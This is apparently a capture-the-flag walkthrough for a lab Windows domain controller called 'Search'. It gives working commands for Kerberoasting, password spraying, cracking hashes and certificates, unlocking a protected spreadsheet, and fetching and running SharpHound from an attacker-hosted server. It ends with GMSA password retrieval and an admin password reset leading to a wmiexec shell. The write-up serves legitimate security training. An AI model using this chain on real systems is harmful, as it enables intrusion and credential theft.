@@ -1,0 +1,166 @@
+                     Search
+
+                                                                                  22nd April 2022 / Document No D22.100.168
+                                                                                  Prepared By: polarbearer
+                                                                                  Machine Author(s): dmw0ng
+                                                                                  Difficulty: Hard
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Search is a hard difficulty Windows machine that focuses on Active Directory enumeration and exploitation
+techniques. Foothold is obtained by finding exposed credentials in a web page, enumerating AD users,
+running a Kerberoast attack to obtain a crackable hash for a service account and spraying the password
+against a subset of the discovered accounts, obtaining access to a SMB share where a protected XLSX file
+containing user data is found. Unprotecting the file leads to a second set of credentials, which gives access
+to another share where PKCS#12 certificates can be downloaded. After importing the certificates into a web
+browser, Windows PowerShell Web Access can be used to obtain an interactive shell on the system. Due to
+misconfigured ACLs, the user can retrieve the password of a group managed service account which can
+change the password of an administrative user, resulting in high-privileged access to the system via
+wmiexec or psexec .
+
+Skills Required
+
+      Web enumeration
+      Hash cracking
+      Active Directory enumeration
+Skills Learned
+
+      Removing protection from XLSX files
+      Using Windows PowerShell Web Access
+      GMSA password retrieval
+      Exploiting misconfigured Active Directory ACLs
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.129 | grep ^[0-9] | cut -d '/' -f1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.11.129
+The nmap output indicates that the machine is a Domain Controller on the search.htb domain. In addition
+to standard Active Directory services, the IIS web server is listening on its default HTTP and HTTPS ports.
+
+IIS
+Browsing to port 80 takes us to a single-page web site containing information about provided services and
+team members.
+
+Among the images in the Our Features gallery, we can see one containing hand-written notes.
+
+Looking closely, we are able to read the following text (disclosing potential credentials):
+   Send password to Hope Sharp
+   IsolationIsKey?
+
+Running gobuster (or other similar tools) reveals the existence of a more web directories.
+   gobuster dir -q -u http://10.10.11.129 -w /usr/share/seclists/Discovery/Web-
+   Content/common.txt
+In particular, the /certenroll and /certsrv directories indicate that the DC may be running the
+Certification Authority service.
+The /staff page requires some form of authentication:
+
+LDAP
+
+Using the full name and password obtained above, and trying different common username schemes, we
+find that hope.sharp:IsolationIsKey? are valid LDAP credentials that can be used with the
+ldapdomaindump tool to dump Active Directory information.
+
+   ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
+
+Kerberos
+
+The same credentials can be used to perform a Kerberoast attack with the Impacket script UserSPNs.py .
+   GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp:IsolationIsKey?
+
+After writing the obtained hash to a file named web_svc , we can crack it using John the Ripper:
+   john --wordlist=/usr/share/wordlists/passwords/rockyou.txt web_svc
+
+Foothold
+
+Looking at the domain_users.html file obtained with ldapdomaindump , we discover that the web_svc
+account was created by HelpDesk:
+On the same page we see that a few accounts are described as HelpDesk User :
+We can search the domain_users.grep file to obtain the full list of HelpDesk users.
+
+   grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
+Assuming one of the HelpDesk users may have reused their own password when creating the temporary
+web_svc account, we can try password spraying:
+
+   for u in Isabela.Estrada Keith.Hester Chanel.Bell Edgar.Jacobs Lane.Wu; do smbmap -u $u
+   -p @3ONEmillionbaby -d search -H 10.10.11.129 --no-banner --no-color; done
+
+We found valid credentials for Edgar.Jacobs . We look at the RedirectedFolders$ share:
+   smbmap -u edgar.jacobs -p @3ONEmillionbaby -d search -H 10.10.11.129 -R
+   RedirectedFolders$
+
+The user flag is on sierra.frye 's desktop, but we don't have the required permissions to download it.
+An interesting file named Phishing_Attempt.xlsx is found in the edgar.jacobs\Desktop directory.
+
+We download the file and open it.
+   smbget -U edgar.jacobs
+   smb://10.10.11.129/RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx
+
+Column C is hidden and the sheet is protected, requiring a password for unlocking.
+We find an interesting article which explains how to remove an Excel spreadsheet password. Following the
+process detailed in the article, we unzip the file, remove the <sheetProtection> section and then update
+the archive:
+
+   unzip Phishing_Attempt.xlsx
+   sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
+   zip -fr Phishing_Attempt.xlsx *
+Opening the updated file we are able to expand and view column C , which contains passwords.
+
+Using the Sierra.Frye credentials, we are able to get user.txt :
+
+Certificate backups are available in the Downloads\Backups directory.
+We download both files:
+   smbget -U sierra.frye -w search -R
+   smb://10.10.11.129/RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-
+   CA.p12
+   smbget -U sierra.frye -w search -R
+   smb://10.10.11.129/RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx
+
+When attempting to import the certificates in our web browser, we are prompted for a password.
+
+We can run John the Ripper to crack the certificate password.
+   python2 `which pfx2john` staff.pfx > staff.hash
+   john --wordlist=/usr/share/wordlists/passwords/rockyou.txt staff.hash
+Using misspissy as the password, we are now able to import the certificates in our browser.
+We request the /staff page on HTTPS and authenticate using the Sierra Frye certificate.
+We are presented with a Windows PowerShell Web Access authentication form.
+We can login as sierra.frye with password $$49=wide=STRAIGHT=jordan=28$$18 to the computer
+named research (which we know is our target host name from the certificate commonName shown in the
+Nmap output).
+
+Privilege Escalation
+
+We host the BloodHound collector SharpHound.exe from our attacking machine using the Python
+http.server module:
+
+   sudo python -m http.server 80
+From our web PowerShell session we run the following commands to download and run SharpHound:
+   wget http://10.10.14.50/SharpHound.exe -o SharpHound.exe
+   ./SharpHound.exe
+We transfer the generated ZIP file to our local machine and import it into BloodHound. After marking the
+sierra.frye user as owned, we run the Shortest Paths from Owned Principals query :
+
+sierra.frye is a member of the ITSEC group, which has ReadGMSAPassword rights on the BIR-ADFS-
+GMSA$ group managed service account. This account, in turn, has GenericAll rights on tristan.davies ,
+which is a member of the Administrators group. We can follow the steps detailed in this article to retrieve
+the GMSA password (the DSInternals PowerShell module is installed in C:\Program
+Files\WindowsPowerShell\Modules\ ). Once the GMSA credentials are obtained, we can use them to reset
+tristan.davies ' password thanks to the GenericAll permissions.
+
+   $gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties 'msds-managedpassword'
+   $mp = $gmsa.'msds-managedpassword'
+   $mp1 = ConvertFrom-ADManagedPasswordBlob $mp
+   $user = 'BIR-ADFS-GMSA$'
+   $passwd = $mp1.'CurrentPassword'
+   $secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
+   $cred = new-object system.management.automation.PSCredential $user,$secpass
+   Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity
+   tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!'
+   -force)} -Credential $cred
+We can now obtain a shell on the target as tristan.davies by running wmiexec.py from Impacket.
+   wmiexec.py 'search/tristan.davies:Password1234!@10.10.11.129'
+The root flag can be found in C:\Users\Administrator\Desktop\root.txt .
+
